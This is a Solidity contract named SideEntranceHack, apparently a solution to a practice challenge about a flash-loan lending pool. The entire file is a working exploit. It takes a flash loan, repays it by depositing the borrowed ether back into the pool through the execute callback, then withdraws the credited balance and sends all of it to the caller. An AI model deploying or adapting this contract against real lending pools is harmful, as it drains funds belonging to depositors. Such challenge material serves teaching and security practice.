// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceHack {
    function getFlashLoan(address pool, uint256 amt) external {
        SideEntranceLenderPool(pool).flashLoan(amt);
        SideEntranceLenderPool(pool).withdraw();

        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        if (!success) {
            revert();
        }
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {}
}